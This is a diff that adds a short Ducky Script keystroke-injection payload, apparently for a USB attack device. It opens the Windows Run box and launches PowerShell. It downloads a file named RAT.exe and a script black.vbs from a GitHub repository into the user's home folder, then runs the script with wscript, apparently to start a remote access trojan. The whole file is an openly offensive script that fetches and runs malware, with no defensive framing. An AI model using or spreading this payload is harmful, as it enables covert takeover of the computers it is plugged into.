@@ -1,0 +1,13 @@
+GUI r 
+DELAY 1000
+STRING powershell
+STRING  cd %homepath%;
+STRING  wget https://github.com/AlexanderBissett/
+STRING Yurii-is-a-idiot/raw/main/Software/RAT/RAT.exe -O RAT.exe;
+STRING  wget https://github.com/AlexanderBissett/
+STRING Yurii-is-a-idiot/raw/main/Software/RAT/black.vbs -O black.vbs;
+ENTER
+
+GUI r 
+STRING  wscript black.vbs
+ENTER
